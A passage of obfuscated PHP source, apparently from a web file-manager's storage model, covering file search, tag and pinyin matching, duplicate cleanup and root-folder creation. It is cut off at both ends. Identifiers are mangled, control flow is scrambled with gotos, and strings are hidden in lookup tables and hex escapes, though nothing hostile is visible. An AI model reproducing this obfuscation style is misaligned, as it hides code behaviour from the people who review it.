$aæÓ†‹‘¶İ =& $_SERVER[Ä¿Ş°¨]; $E‘šŒ’‰› = Model($aæÓ†‹‘¶İ[746])->sourceInfo($F’—î¡ˆÏÒ); $this->addHistory($E‘šŒ’‰›); goto D¶…ÊöÚƒ¡; D¶…ÊöÚƒ¡: $E¦·½á¬¹ = $this->find($DĞ‚ÄÈÖÓœ); $FèÓ„é›ÁŸ = array($aæÓ†‹‘¶İ[423] => $E¦·½á¬¹[$aæÓ†‹‘¶İ[423]], $aæÓ†‹‘¶İ[77] => $E¦·½á¬¹[$aæÓ†‹‘¶İ[77]], $aæÓ†‹‘¶İ[106] => time(), $aæÓ†‹‘¶İ[384] => USER_ID); Model($aæÓ†‹‘¶İ[746])->where(array($aæÓ†‹‘¶İ[374] => $F’—î¡ˆÏÒ))->save($FèÓ„é›ÁŸ); goto f÷öòº¥âÎ; f÷öòº¥âÎ: return $this->where(array($aæÓ†‹‘¶İ[390] => $DĞ‚ÄÈÖÓœ))->delete(); goto dğ‹£‘Òé¼; dğ‹£‘Òé¼: } public function clearSame($C­ç—î®¢¿) { goto dššç•šù÷; dššç•šù÷: $f‘‡Òœõ“ =& $_SERVER[Ä¿Ş°¨]; $e²ŠÓÌæëŒ = $this->listData($C­ç—î®¢¿); $f•ÔÖÎëí = array_to_keyvalue_group($e²ŠÓÌæëŒ, $f‘‡Òœõ“[423]); goto a§©ÁŞˆŠö; F‚Ğ¹ó™Ğí: if (!$CÊŠÜ ¤½¿) { return; } $this->where(array($f‘‡Òœõ“[372] => array($f‘‡Òœõ“[7], $CÊŠÜ ¤½¿)))->delete(); Model($f‘‡Òœõ“[426])->remove($e•˜ÅåÍ); goto eÀø†îĞçÉ; a§©ÁŞˆŠö: $e•˜ÅåÍ = array(); $CÊŠÜ ¤½¿ = array(); foreach ($f•ÔÖÎëí as $DâÙ‘ï ‡Ø) { if (!$DâÙ‘ï ‡Ø || count($DâÙ‘ï ‡Ø) <= 1) { continue; } foreach ($DâÙ‘ï ‡Ø as $DªŸªñ…¹) { $e•˜ÅåÍ[] = $DªŸªñ…¹[$f‘‡Òœõ“[423]]; $CÊŠÜ ¤½¿[] = $DªŸªñ…¹[$f‘‡Òœõ“[372]]; } } goto F‚Ğ¹ó™Ğí; eÀø†îĞçÉ: } public function userSpace() { $D„¾¹™Ÿé· =& $_SERVER[Ä¿Ş°¨]; $E‹× ˆÌ—Ç = $this->tablePrefix; $D­Ó×ôäÙ¸ = array($D„¾¹™Ÿé·[1390] => USER_ID); $B¤÷Œ£íÕ = "{$E‹× ˆÌ—Ç}\x69\157\x5f\146\151\x6c\145\40\x66\151\154\x65\x73\x20\157\156\x20\x66\x69\154\x65\163\56\x66\151\154\145\111\104\40\x3d\x20\150\151\163\x74\157\x72\x79\56\x66\x69\154\x65\111\x44"; return $this->alias($D„¾¹™Ÿé·[2259])->where($D­Ó×ôäÙ¸)->join($B¤÷Œ£íÕ, $D„¾¹™Ÿé·[2260])->sum($D„¾¹™Ÿé·[77]); } } class SourceListSearchModel extends SourceListMoveModel { public static function fileTypeWhere($EˆÈËÖâã–) { goto Dó¬—®áá; Dó¬—®áá: $cµÑ›³ìéô =& $_SERVER[Ä¿Ş°¨]; $eÖùÎó‰ÀÀ = KodIO::fileTypeList(); $BÁÔ§À‘ = $eÖùÎó‰ÀÀ[$EˆÈËÖâã–]; goto AŸ×ÈÈ Éİ; bîã§ñ‰®¿: if (!$BÁÔ§À‘[$cµÑ›³ìéô[156]]) { $Dò©Á¶í†Š = array_to_keyvalue($eÖùÎó‰ÀÀ, $cµÑ›³ìéô[33], $cµÑ›³ìéô[156]); $a¥´àÃ˜ = implode($cµÑ›³ìéô[47], $Dò©Á¶í†Š); $c”¥¹µä¯÷ = $cµÑ›³ìéô[2217]; } $E¯ë“é‚›… = explode($cµÑ›³ìéô[47], trim($a¥´àÃ˜, $cµÑ›³ìéô[47])); return array($c”¥¹µä¯÷, $E¯ë“é‚›…); goto Fâ©ğÄ¨‹; AŸ×ÈÈ Éİ: if (!$BÁÔ§À‘) { return array(); } $a¥´àÃ˜ = $BÁÔ§À‘[$cµÑ›³ìéô[156]]; $c”¥¹µä¯÷ = $cµÑ›³ìéô[7]; goto bîã§ñ‰®¿; Fâ©ğÄ¨‹: } public function listPathType($EåÅ½ØÉññ) { $AèŠá¢Û§« =& $_SERVER[Ä¿Ş°¨]; $e–š®§ŒĞ¯ = $this->fileTypeWhere($EåÅ½ØÉññ); if (!$e–š®§ŒĞ¯) { return array(); } $E÷ã‘ïíäø = array($AèŠá¢Û§«[525] => SourceModel::TYPE_USER, $AèŠá¢Û§«[526] => USER_ID, $AèŠá¢Û§«[522] => 0, $AèŠá¢Û§«[523] => $e–š®§ŒĞ¯); return $this->listSource($E÷ã‘ïíäø); } public function listSearch($Cë×ğ–µ×…, $eÂßô»²„ = 300) { goto Fâ«’«Å¯¢; Fâ«’«Å¯¢: $B²…÷ç¥œÑ =& $_SERVER[Ä¿Ş°¨]; if (isset($Cë×ğ–µ×…[$B²…÷ç¥œÑ[2139]]) && $Cë×ğ–µ×…[$B²…÷ç¥œÑ[2139]]) { $Cë×ğ–µ×…[$B²…÷ç¥œÑ[2139]] = str_replace($B²…÷ç¥œÑ[1551], $B²…÷ç¥œÑ[2261], trim($Cë×ğ–µ×…[$B²…÷ç¥œÑ[2139]])); } $e¿½…òÏòÁ = $this->_parseSearchWhere($Cë×ğ–µ×…); goto FšŒñÎƒÕÌ; FšŒñÎƒÕÌ: if (!isset($e¿½…òÏòÁ[$B²…÷ç¥œÑ[401]])) { $e¿½…òÏòÁ[$B²…÷ç¥œÑ[401]] = 0; } $fÃÄ²èŞ»– = $B²…÷ç¥œÑ[2262]; $b‹àİ”Û¼£ = $fÃÄ²èŞ»–; goto bß›ÓİƒÒ‘; Fïòßªé•: $this->_listMake($bîÖË•èÊ˜); return $bîÖË•èÊ˜; goto f©Š´ß¡àÂ; Aø÷æİ‰ß×: $this->_listSearchDesc($bîÖË•èÊ˜, $Cë×ğ–µ×…, $b‹àİ”Û¼£); $this->_listSearchTag($bîÖË•èÊ˜, $Cë×ğ–µ×…, $b‹àİ”Û¼£); $this->_listDataApply($bîÖË•èÊ˜[$B²…÷ç¥œÑ[350]]); goto Fïòßªé•; bß›ÓİƒÒ‘: $this->_listSearchBindPinyin($Cë×ğ–µ×…, $e¿½…òÏòÁ, $fÃÄ²èŞ»–); $this->alias($B²…÷ç¥œÑ[491])->_makeOrder()->cache(null, 10); $bîÖË•èÊ˜ = $this->distinct(!0)->field($fÃÄ²èŞ»–)->where($e¿½…òÏòÁ)->selectPage($eÂßô»²„); goto Aø÷æİ‰ß×; f©Š´ß¡àÂ: } private function _listSearchTag(&$fˆÉ©ÌˆÇµ, $Añ›‘¥Õ”æ, $DÀÓĞ¯ÇŠ) { goto BÃ„…í›¬; BÕÈ–ë„¿: $AÇ‡ï¾¸‰… = array(); $C…ƒœø©²± = $Añ›‘¥Õ”æ[$EîŞºÑ¥çÔ[2139]]; foreach ($E…†ß²Óˆá as $A»Ÿ ¬Î‚‹) { $AšÖ¼áçÜ = $A»Ÿ ¬Î‚‹[$EîŞºÑ¥çÔ[28]]; $Bª¨´§Œñ­ = str_replace($EîŞºÑ¥çÔ[50], $EîŞºÑ¥çÔ[33], Pinyin::encode($AšÖ¼áçÜ)); if (stripos($AšÖ¼áçÜ, $C…ƒœø©²±) !== !1 || stripos($Bª¨´§Œñ­, $C…ƒœø©²±) !== !1) { $AÇ‡ï¾¸‰…[] = $A»Ÿ ¬Î‚‹[$EîŞºÑ¥çÔ[372]]; } } goto EÍ¹—‚ì ; BÃ„…í›¬: $EîŞºÑ¥çÔ =& $_SERVER[Ä¿Ş°¨]; if (!$Añ›‘¥Õ”æ[$EîŞºÑ¥çÔ[2139]] || $fˆÉ©ÌˆÇµ[$EîŞºÑ¥çÔ[347]][$EîŞºÑ¥çÔ[336]] > 1) { return; } $E…†ß²Óˆá = Model($EîŞºÑ¥çÔ[2263])->listData(); goto BÕÈ–ë„¿; EÍ¹—‚ì : if (!$AÇ‡ï¾¸‰…) { return; } $F÷¸ÅÂØ = array($EîŞºÑ¥çÔ[398] => array($EîŞºÑ¥çÔ[7], $AÇ‡ï¾¸‰…)); $e£î±†•µ = Model($EîŞºÑ¥çÔ[2264])->field($EîŞºÑ¥çÔ[75])->where($F÷¸ÅÂØ)->select(); goto dòÏ†°‚ĞÜ; dòÏ†°‚ĞÜ: $e£î±†•µ = array_to_keyvalue($e£î±†•µ, $EîŞºÑ¥çÔ[33], $EîŞºÑ¥çÔ[75]); $c­†ÏĞ÷²« = array_unique($e£î±†•µ); $this->_listSearchMerge($fˆÉ©ÌˆÇµ, $Añ›‘¥Õ”æ, $DÀÓĞ¯ÇŠ, $c­†ÏĞ÷²«); goto F³¯­©Ì‰ƒ; F³¯­©Ì‰ƒ: } private function _listSearchDesc(&$Bì°–½œğ¯, $E¿ìàğ«‘, $dœ£ñ­å˜) { goto B‚´Ì¡ÉØ; CÌš¶¸ØÈİ: $B¹Ö»¨ß¿ = Model($DÇ‘Ü™Àõº[508])->field($DÇ‘Ü™Àõº[374])->where($e…¬èÁ¸ë)->select(); $f†ó›¶®¿î = array_to_keyvalue($B¹Ö»¨ß¿, $DÇ‘Ü™Àõº[33], $DÇ‘Ü™Àõº[374]); $this->_listSearchMerge($Bì°–½œğ¯, $E¿ìàğ«‘, $dœ£ñ­å˜, $f†ó›¶®¿î); goto Eğ±Šµ¸µ; A¶ÁöÆ¢Õé: $dìÏó×óµ¨ = array_unique($dìÏó×óµ¨); if (!$dìÏó×óµ¨) { return; } $e…¬èÁ¸ë = array($DÇ‘Ü™Àõº[374] => array($DÇ‘Ü™Àõº[7], $dìÏó×óµ¨), $DÇ‘Ü™Àõº[89] => $DÇ‘Ü™Àõº[409], $DÇ‘Ü™Àõº[355] => array($DÇ‘Ü™Àõº[745], $DÇ‘Ü™Àõº[2141] . $E¿ìàğ«‘[$DÇ‘Ü™Àõº[2139]] . $DÇ‘Ü™Àõº[2141])); goto CÌš¶¸ØÈİ; B‚´Ì¡ÉØ: $DÇ‘Ü™Àõº =& $_SERVER[Ä¿Ş°¨]; if (!$E¿ìàğ«‘[$DÇ‘Ü™Àõº[2139]] || $Bì°–½œğ¯[$DÇ‘Ü™Àõº[347]][$DÇ‘Ü™Àõº[336]] > 1) { return; } $dìÏó×óµ¨ = $this->listSearchChildren($E¿ìàğ«‘[$DÇ‘Ü™Àõº[465]]); goto A¶ÁöÆ¢Õé; Eğ±Šµ¸µ: } private function _listSearchMerge(&$eˆíÓĞªƒ, $c…ÉË»Œ, $EÌÄÂ”ˆ”É, $Dñô·÷ë½) { goto C´÷ÒàÑİ®; bëµ’Í‡ù­: $AèÂ£Š„¨Ê = $this->field($EÌÄÂ”ˆ”É)->where($bŸ«¤ìÜÙ)->select(); if (!$AèÂ£Š„¨Ê) { return; } $cÑíŒí«½ = array(); goto fêÎó—“Ô; F¡§Éœ¶Ê: $E’ïò…ù‚Œ = array_diff($Dñô·÷ë½, $cßİàŠÉê©); if (!$E’ïò…ù‚Œ) { return; } $bŸ«¤ìÜÙ = array($cÚÏ…„„å‹[374] => array($cÚÏ…„„å‹[7], $E’ïò…ù‚Œ)); goto bëµ’Í‡ù­; fêÎó—“Ô: foreach ($AèÂ£Š„¨Ê as $eÊ¬í·êï) { $DÑŸİ˜¿Í = $cÚÏ…„„å‹[47] . $c…ÉË»Œ[$cÚÏ…„„å‹[465]] . $cÚÏ…„„å‹[47]; if (stripos($eÊ¬í·êï[$cÚÏ…„„å‹[463]], $DÑŸİ˜¿Í) !== !1) { $cÑíŒí«½[] = $eÊ¬í·êï; } } $eˆíÓĞªƒ[$cÚÏ…„„å‹[350]] = array_merge($cÑíŒí«½, $eˆíÓĞªƒ[$cÚÏ…„„å‹[350]]); $eˆíÓĞªƒ[$cÚÏ…„„å‹[347]][$cÚÏ…„„å‹[348]] += count($cÑíŒí«½); goto BÑë§¡³¿À; C´÷ÒàÑİ®: $cÚÏ…„„å‹ =& $_SERVER[Ä¿Ş°¨]; if (!$Dñô·÷ë½) { return; } $cßİàŠÉê© = array_to_keyvalue($eˆíÓĞªƒ[$cÚÏ…„„å‹[350]], $cÚÏ…„„å‹[33], $cÚÏ…„„å‹[374]); goto F¡§Éœ¶Ê; BÑë§¡³¿À: } public function listSearchChildren($A¨‡‡¶¼, $F‚ğºö×°Ş = 5000) { goto Eëã§ôõå§; EÕ¸Œø´¾: $A¦Ëã»ğ = array($FË¥‰…ÔÎ­[463] => array($FË¥‰…ÔÎ­[745], $EìÇ†ÍÇ°[$FË¥‰…ÔÎ­[463]] . $EìÇ†ÍÇ°[$FË¥‰…ÔÎ­[374]] . $FË¥‰…ÔÎ­[488])); $d×¨Ÿ¶„¦– = $this->field($FË¥‰…ÔÎ­[374])->cache(null, 600)->where($A¦Ëã»ğ)->count(); if ($d×¨Ÿ¶„¦– > $F‚ğºö×°Ş) { return $this->_listSearchChildrenNear($A¨‡‡¶¼, $F‚ğºö×°Ş); } goto e…Õè·°–Ã; Eëã§ôõå§: $FË¥‰…ÔÎ­ =& $_SERVER[Ä¿Ş°¨]; $E®½ÀÁ = array(); $EìÇ†ÍÇ° = $this->sourceInfo($A¨‡‡¶¼); goto EÕ¸Œø´¾; e…Õè·°–Ã: $C»•¤ÏÚÑ¸ = $this->field($FË¥‰…ÔÎ­[374])->where($A¦Ëã»ğ)->select(); $E®½ÀÁ = array_to_keyvalue($C»•¤ÏÚÑ¸, $FË¥‰…ÔÎ­[33], $FË¥‰…ÔÎ­[374]); return $E®½ÀÁ; goto FÀ¾”òãÁ; FÀ¾”òãÁ: } private function _listSearchChildrenNear($Eñ¿İ¶õ·, $dÚ•¯) { goto EÑ·àœòÃ­; Aƒö‰ï: $aÍˆ±¨ = $this->field($BÍ†ŸêË„[2265])->where($f¥ß…ç‹ğŸ)->select(); $DàÉõÈÀ—Ÿ = array_to_keyvalue(array_filter_by_field($aÍˆ±¨, $BÍ†ŸêË„[375], $BÍ†ŸêË„[83]), $BÍ†ŸêË„[33], $BÍ†ŸêË„[374]); $CÃ„ó°°¥Ã = array_merge($CÃ„ó°°¥Ã, array_to_keyvalue($aÍˆ±¨, $BÍ†ŸêË„[33], $BÍ†ŸêË„[374])); goto F¨›±‡™¶; EÑ·àœòÃ­: $BÍ†ŸêË„ =& $_SERVER[Ä¿Ş°¨]; $CÃ„ó°°¥Ã = array(); $f¥ß…ç‹ğŸ = array($BÍ†ŸêË„[465] => $Eñ¿İ¶õ·); goto Aƒö‰ï; F¨›±‡™¶: if (!$DàÉõÈÀ—Ÿ) { return $CÃ„ó°°¥Ã; } $f¥ß…ç‹ğŸ = array($BÍ†ŸêË„[465] => array($BÍ†ŸêË„[7], $DàÉõÈÀ—Ÿ)); $aÍˆ±¨ = $this->field($BÍ†ŸêË„[2265])->where($f¥ß…ç‹ğŸ)->select(); goto A”Ï¢ƒŞ‘„; A”Ï¢ƒŞ‘„: $CÃ„ó°°¥Ã = array_merge($CÃ„ó°°¥Ã, array_to_keyvalue($aÍˆ±¨, $BÍ†ŸêË„[33], $BÍ†ŸêË„[374])); $CÃ„ó°°¥Ã = array_slice($CÃ„ó°°¥Ã, 0, $dÚ•¯); return $CÃ„ó°°¥Ã; goto fçÃœ¿ÖÙ; fçÃœ¿ÖÙ: } private function _listSearchBindPinyin($Bİ¢ªÛ³†, &$fïá› ²”µ, &$cä‡ˆã½Í…) { goto D¡í“ºÍ†; c¼îæ´ò¹†: $Eó”ÖŸŸ®ö = array(); $cä‡ˆã½Í… = str_replace(array($aêÅá [213], $aêÅá [50], $aêÅá [2266]), $aêÅá [33], $cä‡ˆã½Í…); $cä‡ˆã½Í… = $aêÅá [2267] . str_replace($aêÅá [47], $aêÅá [2268], $cä‡ˆã½Í…); goto a«ôêÄ×¦; D¡í“ºÍ†: $aêÅá  =& $_SERVER[Ä¿Ş°¨]; if (!Input::check($Bİ¢ªÛ³†[$aêÅá [2139]], $aêÅá [302]) || strlen($Bİ¢ªÛ³†[$aêÅá [2139]]) < 2) { return; } $b‡áêØòºæ = "\x4c\x45\x46\124\x20\112\x4f\x49\x4e\40{$this->tablePrefix}\151\x6f\x5f\163\x6f\x75\x72\x63\145\137\x6d\x65\164\x61\40\155\x65\x74\141\x20\157\156\x20\x73\157\165\x72\143\145\56\x73\157\165\162\143\145\111\x44\x20\75\x20\x6d\x65\x74\141\56\163\x6f\165\162\x63\x65\x49\104"; goto c¼îæ´ò¹†; a«ôêÄ×¦: unset($fïá› ²”µ[$aêÅá [28]]); foreach ($fïá› ²”µ as $D˜°¶ÈŸï => $A¨â»—°ƒ©) { $Eó”ÖŸŸ®ö[$aêÅá [2267] . $D˜°¶ÈŸï] = $A¨â»—°ƒ©; } $e˜ˆ°¤µ›ñ = array($aêÅá [487], $aêÅá [2141] . $Bİ¢ªÛ³†[$aêÅá [2139]] . $aêÅá [2141]); goto f´Ş¹Ó»; f´Ş¹Ó»: $Eó”ÖŸŸ®ö[] = array($aêÅá [2269] => $e˜ˆ°¤µ›ñ, $aêÅá [901] => $aêÅá [2143], array($aêÅá [2270] => $e˜ˆ°¤µ›ñ, $aêÅá [2271] => array($aêÅá [7], array($aêÅá [420], $aêÅá [419])))); $this->join($b‡áêØòºæ); $fïá› ²”µ = $Eó”ÖŸŸ®ö; goto eÄŒ®®æÖ–; eÄŒ®®æÖ–: } private function _parseSearchWhere($BŠŒ¡˜‚à) { goto bîŒä—©¾ß; a…ÔÚ½½Æ: if (isset($BŠŒ¡˜‚à[$FÊ‰“‘ç‡[697]])) { $FÂÍï÷Ş¸… = array($FÊ‰“‘ç‡[2273], $BŠŒ¡˜‚à[$FÊ‰“‘ç‡[697]]); if ($E‚ŞˆÀ±‚ö[$FÊ‰“‘ç‡[106]]) { $E‚ŞˆÀ±‚ö[$FÊ‰“‘ç‡[106]] = array($E‚ŞˆÀ±‚ö[$FÊ‰“‘ç‡[106]], $FÂÍï÷Ş¸…, $FÊ‰“‘ç‡[2274]); } else { $E‚ŞˆÀ±‚ö[$FÊ‰“‘ç‡[106]] = $FÂÍï÷Ş¸…; } } if (isset($BŠŒ¡˜‚à[$FÊ‰“‘ç‡[2275]])) { $E‚ŞˆÀ±‚ö[$FÊ‰“‘ç‡[77]] = array($FÊ‰“‘ç‡[2272], $BŠŒ¡˜‚à[$FÊ‰“‘ç‡[2275]]); } if (isset($BŠŒ¡˜‚à[$FÊ‰“‘ç‡[2276]])) { $FÂÍï÷Ş¸… = array($FÊ‰“‘ç‡[2273], $BŠŒ¡˜‚à[$FÊ‰“‘ç‡[2276]]); if ($E‚ŞˆÀ±‚ö[$FÊ‰“‘ç‡[77]]) { $E‚ŞˆÀ±‚ö[$FÊ‰“‘ç‡[77]] = array($E‚ŞˆÀ±‚ö[$FÊ‰“‘ç‡[77]], $FÂÍï÷Ş¸…, $FÊ‰“‘ç‡[2274]); } else { $E‚ŞˆÀ±‚ö[$FÊ‰“‘ç‡[77]] = $FÂÍï÷Ş¸…; } } goto F¢¿Ç¦ö÷¤; föóÌÑÎòæ: if (isset($BŠŒ¡˜‚à[$FÊ‰“‘ç‡[2139]]) && $BŠŒ¡˜‚à[$FÊ‰“‘ç‡[2139]]) { $D•¥øª…‚§ = $BŠŒ¡˜‚à[$FÊ‰“‘ç‡[2139]]; $Bõ©ï å› = explode($FÊ‰“‘ç‡[50], $D•¥øª…‚§); if (strlen($D•¥øª…‚§) > 2 && (substr($D•¥øª…‚§, 0, 1) == $FÊ‰“‘ç‡[112] && substr($D•¥øª…‚§, -1) == $FÊ‰“‘ç‡[112]) || substr($D•¥øª…‚§, 0, 1) == $FÊ‰“‘ç‡[55] && substr($D•¥øª…‚§, -1) == $FÊ‰“‘ç‡[55]) { $D•¥øª…‚§ = substr($D•¥øª…‚§, 1, -1); $Bõ©ï å› = array($D•¥øª…‚§); } $E‚ŞˆÀ±‚ö[$FÊ‰“‘ç‡[28]] = array($FÊ‰“‘ç‡[487], $FÊ‰“‘ç‡[2141] . $D•¥øª…‚§ . $FÊ‰“‘ç‡[2141]); if (count($Bõ©ï å›) > 1) { $E‚ŞˆÀ±‚ö[$FÊ‰“‘ç‡[28]] = array(); foreach ($Bõ©ï å› as $E£Ì©æ‘¼) { if (!trim($E£Ì©æ‘¼)) { continue; } $E‚ŞˆÀ±‚ö[$FÊ‰“‘ç‡[28]][] = array($FÊ‰“‘ç‡[487], $FÊ‰“‘ç‡[2141] . trim($E£Ì©æ‘¼) . $FÊ‰“‘ç‡[2141]); } } } return $E‚ŞˆÀ±‚ö; goto fø¹—ø»ğæ; F¢¿Ç¦ö÷¤: if (isset($BŠŒ¡˜‚à[$FÊ‰“‘ç‡[539]])) { $E‚ŞˆÀ±‚ö[] = array($FÊ‰“‘ç‡[384] => $BŠŒ¡˜‚à[$FÊ‰“‘ç‡[539]], $FÊ‰“‘ç‡[383] => $BŠŒ¡˜‚à[$FÊ‰“‘ç‡[539]], $FÊ‰“‘ç‡[901] => $FÊ‰“‘ç‡[2143]); } if (isset($BŠŒ¡˜‚à[$FÊ‰“‘ç‡[377]])) { $Dö«÷æˆÔŠ = $BŠŒ¡˜‚à[$FÊ‰“‘ç‡[377]]; if ($Dö«÷æˆÔŠ == $FÊ‰“‘ç‡[76]) { $E‚ŞˆÀ±‚ö[$FÊ‰“‘ç‡[375]] = 1; } else { if ($Dö«÷æˆÔŠ == $FÊ‰“‘ç‡[2277]) { $E‚ŞˆÀ±‚ö[$FÊ‰“‘ç‡[375]] = 0; } else { if ($Dö«÷æˆÔŠ) { $Dö«÷æˆÔŠ = is_array($Dö«÷æˆÔŠ) ? $Dö«÷æˆÔŠ : explode($FÊ‰“‘ç‡[47], $Dö«÷æˆÔŠ); $E‚ŞˆÀ±‚ö[$FÊ‰“‘ç‡[377]] = array($FÊ‰“‘ç‡[389], $Dö«÷æˆÔŠ); $E‚ŞˆÀ±‚ö[$FÊ‰“‘ç‡[375]] = 0; } } } } if (isset($BŠŒ¡˜‚à[$FÊ‰“‘ç‡[465]])) { $CÁ¤½¤Ñİå = $this->sourceInfo($BŠŒ¡˜‚à[$FÊ‰“‘ç‡[465]]); $E‚ŞˆÀ±‚ö[$FÊ‰“‘ç‡[529]] = array($FÊ‰“‘ç‡[487], $CÁ¤½¤Ñİå[$FÊ‰“‘ç‡[463]] . $BŠŒ¡˜‚à[$FÊ‰“‘ç‡[465]] . $FÊ‰“‘ç‡[488]); } goto föóÌÑÎòæ; bîŒä—©¾ß: $FÊ‰“‘ç‡ =& $_SERVER[Ä¿Ş°¨]; $E‚ŞˆÀ±‚ö = array(); if (isset($BŠŒ¡˜‚à[$FÊ‰“‘ç‡[696]])) { $E‚ŞˆÀ±‚ö[$FÊ‰“‘ç‡[106]] = array($FÊ‰“‘ç‡[2272], $BŠŒ¡˜‚à[$FÊ‰“‘ç‡[696]]); } goto a…ÔÚ½½Æ; fø¹—ø»ğæ: } } class SourceModel extends SourceListSearchModel { public $statusIgnoreResetSpace = false; public function userRootAdd($dš¤˜ÄÁ¦¬) { $BÛ‡¼²Ê®Ï =& $_SERVER[Ä¿Ş°¨]; $Dµ»î†‘¤ = Model($BÛ‡¼²Ê®Ï[478])->where(array($BÛ‡¼²Ê®Ï[1390] => $dš¤˜ÄÁ¦¬))->find(); $DÕæ¦Äã  = $this->_mkdirRoot(SourceModel::TYPE_USER, $dš¤˜ÄÁ¦¬, $Dµ»î†‘¤[$BÛ‡¼²Ê®Ï[28]]); $this->userDesktopAdd($DÕæ¦Äã ); return $DÕæ¦Äã ; } public function userDesktopAdd($dÅ×ÀÊ‡â) { $cÒÆˆëÔçÉ =& $_SERVER[Ä¿Ş°¨]; $e»‡Ëò’Ù = LNG($cÒÆˆëÔçÉ[2278]); $Fµ”á®Áè¡ = $this->mkdir($dÅ×ÀÊ‡â, $e»‡Ëò’Ù); $this->metaSet($Fµ”á®Áè¡, $cÒÆˆëÔçÉ[2279], $cÒÆˆëÔçÉ[83]); $this->metaSet($dÅ×ÀÊ‡â, $cÒÆˆëÔçÉ[2280], $Fµ”á®Áè¡); } public function groupRootAdd($aìïÅøíµÈ) { $DÖøÉ¿‹ºµ =& $_SERVER[Ä¿Ş°¨]; $D·¹ÙÁñéğ = Model($DÖøÉ¿‹ºµ[462])->where(array($DÖøÉ¿‹ºµ[2135] => $aìïÅøíµÈ))->find(); return $this->_mkdirRoot(SourceModel::TYPE_GROUP, $aìïÅøíµÈ, $D·¹ÙÁñéğ[$DÖøÉ¿‹ºµ[28]]); } public function systemRootPathAdd($DÁš±·Ï„â) { if ($DÁš±·Ï„â != $_SERVER[Ä¿Ş°¨][1074]) { return !1; } return $this->_mkdirRoot(SourceModel::TYPE_SYSTEM, 0, $DÁš±·Ï„â); } public function userRootRemove($d®ÆÆ¨…¼) { $DÕ”Ö«­Ú = $this->sourceRoot(SourceModel::TYPE_USER, $d®ÆÆ¨…¼); if (!$DÕ”Ö«­Ú) { return; } $this->remove($DÕ”Ö«­Ú, !1); } public function groupRootRemove($aŒí¾…“„‡) { $C¹†…Ñ©ĞË = $this->sourceRoot(SourceModel::TYPE_GROUP, $aŒí¾…“„‡); if (!$C¹†…Ñ©ĞË) { return; } $this->remove($C¹†…Ñ©ĞË, !1); } private function _mkdirRoot($a¤„„çİÚä, $a›ßö…ùÙŠ, $bºªêºÚ«) { goto E®ÏŠ¡ƒãá; aòÊšóÄä: CacheLock::unlock($aĞË¼ÕÇà§); return $fÓÈ¼… Ï´; goto B¥À³Åà—; E×à´ˆø ˆ: $fÓÈ¼… Ï´ = $this->add($A„ ë‹½¨); $cËÓ˜ÈĞ²¸ = array($Då°šâ¡Ï[531] => short_id($fÓÈ¼… Ï´)); $this->where(array($Då°šâ¡Ï[388] => $fÓÈ¼… Ï´))->save($cËÓ˜ÈĞ²¸); goto aòÊšóÄä; eÔƒŒ©: $aĞË¼ÕÇà§ = "\115\157\x64\145\x6c\x53\157\x75\162\143\x65\x2e\155\153\x64\x69\x72\122\157\x6f\x74\56{$a¤„„çİÚä}\56{$a›ßö…ùÙŠ}\x2e" . $bºªêºÚ«; CacheLock::lock($aĞË¼ÕÇà§); $A„ ë‹½¨[$Då°šâ¡Ï[28]] = $bºªêºÚ«; goto E×à´ˆø ˆ; E®ÏŠ¡ƒãá: $Då°šâ¡Ï =& $_SERVER[Ä¿Ş°¨]; $A„ ë‹½¨ = array($Då°šâ¡Ï[373] => 0, $Då°šâ¡Ï[525] => $a¤„„çİÚä, $Då°šâ¡Ï[526] => $a›ßö…ùÙŠ, $Då°šâ¡Ï[522] => 1, $Då°šâ¡Ï[527] => USER_ID, $Då°šâ¡Ï[528] => USER_ID, $Då°šâ¡Ï[523] => $Då°šâ¡Ï[33], $Då°šâ¡Ï[529] => $Då°šâ¡Ï[474], $Då°šâ¡Ï[400] => 0, $Då°šâ¡Ï[524] => 0, $Då°šâ¡Ï[424] => 0, $Då°šâ¡Ï[530] => $Då°šâ¡Ï[33]); if ($eÁò›™ = $this->where($A„ ë‹½¨)->find()) { return $eÁò›™[$Då°šâ¡Ï[374]]; } goto eÔƒŒ©; B¥À³Åà—: } private function sourceRoot($E˜Ëßàñ—ó, $aãœÇªÑ¯Â, $FÍÉŠĞôÓ = false) { $Fî˜ÈŸí‘ =& $_SERVER[Ä¿Ş°¨]; $fîŒ¶áåàò = array($Fî˜ÈŸí‘[373] => 0, $Fî˜ÈŸí‘[525] => $E˜Ëßàñ—ó, $Fî˜ÈŸí‘[526] => $aãœÇªÑ¯Â); if ($féë–Œ»¼š = $this->where($fîŒ¶áåàò)->find()) { return $FÍÉŠĞôÓ ? $féë–Œ»¼š : $féë–Œ»¼š[$Fî˜ÈŸí‘[374]]; } return !1; } public function sourceRootGroup($bË«¸·°ğ) { $bŠ®ÜôÀè‰ =& $_SERVER[Ä¿Ş°¨]; if (is_string($bË«¸·°ğ)) { $bË«¸·°ğ = array($bË«¸·°ğ); } $CƒÚ»´¿ÚÀ = array($bŠ®ÜôÀè‰[373] => 0, $bŠ®ÜôÀè‰[525] => SourceModel::TYPE_GROUP, $bŠ®ÜôÀè‰[526] => array($bŠ®ÜôÀè‰[7], $bË«¸·°ğ)); $c×Å¤šÜÖß = $this->listSource($CƒÚ»´¿ÚÀ, 1000); return array_to_keyvalue($c×Å¤šÜÖß[$bŠ®ÜôÀè‰[74]], $bŠ®ÜôÀè‰[460]); } public function mkfile($d·ÈËÍ”œ, $BÂô­Ö¤äÕ, $aÔ­ˆ™’Ò = '', $c«Û­ø®»ò = REPEAT_RENAME) { $c²ÃŠŠÀ¼¯ =& $_SERVER[Ä¿Ş°¨]; $D‹ÌãŒš = Model($c²ÃŠŠÀ¼¯[548])->addFileByContent($aÔ­ˆ™’Ò, $BÂô­Ö¤äÕ); return $this->_createFileCall($d·ÈËÍ”œ, $BÂô­Ö¤äÕ, $D‹ÌãŒš, $c«Û­ø®»ò, $c²ÃŠŠÀ¼¯[1103]); } public function addFile($añ£å©‚˜, $B³Ì–òĞ»İ, $Ešİ ë„Æˆ, $FçÕØ²©¡„ = false, $dãí½·Ÿñ« = REPEAT_RENAME) { $DŠİ‰çàÅÑ = Model($_SERVER[Ä¿Ş°¨][548])->addFile($B³Ì–òĞ»İ, $Ešİ ë„Æˆ, $FçÕØ²©¡„); return $this->_createFileCall($añ£å©‚˜, $Ešİ ë„Æˆ, $DŠİ‰çàÅÑ, $dãí½·Ÿñ«); } public function addFileByFileID($eò¼ˆ¿ø‘ˆ, $fŞĞÈÕÃ‡œ, $dæù†˜àë, $dçÀØÑò­ = REPEAT_RENAME) { $DöˆÚâ’„ =& $_SERVER[Ä¿Ş°¨]; $C“´Çâ”Äâ = 